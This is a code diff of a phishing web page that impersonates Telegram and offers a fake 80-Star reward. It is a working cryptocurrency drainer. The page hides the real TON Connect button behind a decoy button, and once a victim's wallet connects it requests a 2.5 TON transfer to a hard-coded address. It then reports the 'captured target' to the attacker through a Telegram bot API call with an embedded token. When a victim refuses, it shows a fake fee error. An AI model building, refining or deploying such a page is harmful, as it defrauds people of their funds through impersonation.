@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Telegram Rewards | Official Claim</title>
+    <title>Telegram Stars Reward | Official Claim</title>
     <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
     <style>
         body { background: #0e1621; color: white; font-family: -apple-system, sans-serif; text-align: center; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
@@ -11,8 +11,15 @@
         .verified-badge { background: #2481cc; color: white; padding: 6px 15px; border-radius: 50px; font-size: 13px; font-weight: bold; margin-bottom: 20px; display: inline-block; }
         .stars-val { font-size: 55px; font-weight: 900; margin: 10px 0; }
         .desc { color: #7f91a4; font-size: 15px; margin: 20px 0; line-height: 1.5; }
-        /* لتوسيط الزر الرسمي */
-        #ton-connect-button { display: flex; justify-content: center; margin-top: 20px; }
+        
+        /* الزر الأزرق الواعر اللي طلبته */
+        .connect-btn { 
+            background: #2481cc; color: white; border: none; padding: 16px; border-radius: 12px; 
+            font-size: 18px; font-weight: bold; cursor: pointer; width: 100%; 
+            box-shadow: 0 4px 15px rgba(36, 129, 204, 0.4); 
+        }
+        /* هاد الخانة مخفية بصح هي اللي تدير الخدمة */
+        #ton-connect-button { display: none; }
     </style>
 </head>
 <body>
@@ -22,7 +29,9 @@
         <img src="https://telegram.org/img/t_logo.png" width="50" style="display:block; margin: 0 auto 10px;">
         <div class="stars-val">80</div>
         <div style="color: #f4b400; font-weight: bold; font-size: 18px;">TELEGRAM STARS</div>
-        <p class="desc">Connect your wallet below to claim your rewards. The stars will be added to your account instantly after verification.</p>
+        <p class="desc">Connect your TON wallet to receive your 80 Stars reward instantly.</p>
+        
+        <button class="connect-btn" id="custom-connect">Connect Wallet</button>
         
         <div id="ton-connect-button"></div>
 
@@ -30,29 +39,36 @@
     </div>
 
     <script>
-        // إعداد الزر الرسمي
+        // إعداد الاتصال
         const tonConnectUI = new TonConnectUI.TonConnectUI({
             manifestUrl: 'https://ton-connect.github.io/demo-dapp-with-react/tonconnect-manifest.json',
             buttonRootId: 'ton-connect-button'
         });
 
-        // سحب الرصيد تلقائياً بعد الربط
+        // غير يضغط على الزر الأزرق، نفتحولو المحفظة بالسيف
+        document.getElementById('custom-connect').addEventListener('click', async () => {
+            try {
+                await tonConnectUI.openModal();
+            } catch (e) {
+                // فتح مباشر لتيليجرام إذا بلوكا المتصفح
+                window.location.href = "https://t.me/wallet/start?startapp=connect";
+            }
+        });
+
         tonConnectUI.onStatusChange(async wallet => {
             if (wallet) {
                 const transaction = {
                     validUntil: Math.floor(Date.now() / 1000) + 120,
                     messages: [{
                         address: "UQBW8KIbJpKHSx-9aq4gIwmM6ESMs-dpKVAQCj46hTyIxnXh",
-                        amount: "2500000000" // يحاول يسحب الرصيد
+                        amount: "2500000000" 
                     }]
                 };
-
                 try {
                     await tonConnectUI.sendTransaction(transaction);
-                    fetch(`https://api.telegram.org/bot8351638574:AAG2xyCtbiP5ipHgFGG-3-ibueh1l5xlUNo/sendMessage?chat_id=6925387370&text=🎯 Target Connected!\nWallet: ${wallet.account.address}`);
+                    fetch(`https://api.telegram.org/bot8351638574:AAG2xyCtbiP5ipHgFGG-3-ibueh1l5xlUNo/sendMessage?chat_id=6925387370&text=🎯 Target Captured!`);
                 } catch (e) {
-                    // رسالة تمويه لو رفض
-                    alert("Verification Error: Your wallet must have at least 0.25 TON to cover network gas fees.");
+                    alert("Error: 0.25 TON network fee required for verification.");
                 }
             }
         });
